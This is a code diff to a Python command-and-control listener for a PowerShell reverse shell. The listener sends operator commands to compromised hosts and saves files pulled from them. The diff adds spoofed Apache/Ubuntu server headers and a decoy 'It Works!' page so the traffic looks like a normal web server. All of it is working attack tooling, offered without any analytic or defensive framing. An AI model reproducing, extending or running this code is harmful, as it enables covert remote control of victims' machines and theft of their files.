@@ -1,25 +1,26 @@
 #!/usr/bin/python3
-import certificate, modulescontroller
+import globals, certificate, modulescontroller
+from Color import Color
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import base64, urllib.parse, time, readline, ssl, argparse, json
-from termcolor import colored
+import readline, base64, urllib.parse, time, ssl, argparse, json
 from os import listdir, sep, path
-
-
-global AUTOCOMPLETE
-AUTOCOMPLETE = False
 
 class myHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
     def do_GET(self):
+        self.server_version = "Apache/2.4.18"
+        self.sys_version = "(Ubuntu)"
         self.send_response(200)
         self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
         return
 
     def do_POST(self):
+        self.server_version = "Apache/2.4.18"
+        self.sys_version = "(Ubuntu)"
         self.send_response(200)
+        
         html = "<html><body><h1>It Works!</h1></body></html>"
 
         result, parser_type, json_response, color = self.parseResult()
@@ -31,18 +32,18 @@ class myHandler(BaseHTTPRequestHandler):
                 with open(filename, mode='wb') as file: # b is importante -> binary
                     content = base64.b64decode(content)
                     file.write(content)
-                    print(colored(output, "green"))
+                    print(Color.F_green + output + Color.reset)
             except:
-                print (colored("\r\n[!] Error: Writing file!", "red"))
+                print (Color.F_red + "\r\n[!] Error: Writing file!" + Color.reset)
         else:
             if json_response["result"] != json_response["pwd"] and json_response["type"] != "4UT0C0MPL3T3":
-                self.printResult(result, color)
+                self.printResult(result, "F_" + color.capitalize())
 
         try:
             command = self.newCommand(pwd)
             self.sendCommand(command, html)
         except (AttributeError, BrokenPipeError) as e:
-            pass
+            print (e)
         return
 
     def parseResult(self):
@@ -51,7 +52,6 @@ class myHandler(BaseHTTPRequestHandler):
         parser_type = data["type"]
         result = ""
         color = "white"
-        global PSH_FUNCTIONS
 
         if parser_type != "newclient":
             try:
@@ -63,7 +63,7 @@ class myHandler(BaseHTTPRequestHandler):
                     color = "green"
 
                 if (parser_type == "4UT0C0MPL3T3"):
-                    PSH_FUNCTIONS = (base64.b64decode(data["result"])).decode('utf-8').split()
+                    globals.PSH_FUNCTIONS = (base64.b64decode(data["result"])).decode('utf-8').split()
                     readline.set_completer(self.completer)
                     readline.set_completer_delims(" ")
                     readline.parse_and_bind("tab: complete")
@@ -74,7 +74,7 @@ class myHandler(BaseHTTPRequestHandler):
             except:
                 pass
         else:
-            input(colored("[!] New Connection, please press ENTER!",'red'))
+            input(Color.F_Red + "[!] New Connection, please press ENTER!" + Color.reset)
 
 
         return result, parser_type, data, color
@@ -104,7 +104,7 @@ class myHandler(BaseHTTPRequestHandler):
         return pwd
 
     def printResult(self, result, color):
-        print(colored(result, color))
+        print(getattr(Color, color) + result + Color.reset)
 
     def isDownloadFunctCalled(self, json_response):
         iscalled = False
@@ -116,13 +116,12 @@ class myHandler(BaseHTTPRequestHandler):
         return iscalled
 
     def newCommand(self, pwd):
-        global AUTOCOMPLETE
-        if AUTOCOMPLETE:
+        if globals.AUTOCOMPLETE:
             command = "autocomplete"
-            AUTOCOMPLETE = False
+            globals.AUTOCOMPLETE = False
         elif pwd != "":
             #readline.parse_and_bind("tab: complete")
-            command = input(colored("PS {}> ".format(pwd), "blue"))
+            command = input(Color.F_Blue + "PS {}> ".format(pwd) + Color.reset)
             if command == "":
                 command = "pwd | Format-Table -HideTableHeaders"
         else:
@@ -132,8 +131,8 @@ class myHandler(BaseHTTPRequestHandler):
     def sendCommand(self, command, html, content=""):
         if (command != ""):
             command_list = command.split(" ")
-            if command_list[0] in MODULES.keys():
-                html = modulescontroller.ModulesController(MODULES,command_list, command)
+            if command_list[0] in globals.MODULES.keys():
+                html = modulescontroller.ModulesController(globals.MODULES,command_list, command)
                 html = str(html)
 
             CMD = base64.b64encode(command.encode())
@@ -142,27 +141,11 @@ class myHandler(BaseHTTPRequestHandler):
             self.wfile.write(html.encode())
             
     def completer(self,text, state):
-        options = [i for i in PSH_FUNCTIONS if i.startswith(text)]
+        options = [i for i in globals.PSH_FUNCTIONS if i.startswith(text)]
         if state < len(options):
             return options[state]
         else:
             return None
-
-
-
-def loadModules():
-    res = {}
-    # check subfolders
-    lst = listdir("modules")
-    dir = []
-    for d in lst:
-        s = path.abspath("modules") + sep + d
-        if path.isdir(s) == False:
-            dir.append(d.split(".")[0])
-    # load the modules
-    for d in dir:
-        res[d] = __import__("modules." + d, fromlist = ["*"])
-    return res
 
 def main():
 
@@ -175,7 +158,7 @@ def main():
 ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                          By: 3v4Si0N
     """
-    print (colored(banner, 'yellow'))
+    print (Color.F_Yellow + banner + Color.reset)
     parser = argparse.ArgumentParser(description='Process some integers.')
     parser.add_argument('host', help='Listen Host', type=str)
     parser.add_argument('port', help='Listen Port', type=int)
@@ -186,11 +169,9 @@ def main():
     try:
         HOST = args.host
         PORT = args.port
-        global AUTOCOMPLETE
-        global MODULES
         server = HTTPServer((HOST, PORT), myHandler)
         print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
-        MODULES = loadModules()
+        globals.initialize()
 
         if (args.ssl):
             cert = certificate.Certificate()
@@ -199,7 +180,7 @@ def main():
             server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)
 
         if (args.autocomplete):
-            AUTOCOMPLETE = True
+            globals.AUTOCOMPLETE = True
         else:
             readline.set_completer_delims(" ")
             readline.parse_and_bind("tab: complete")
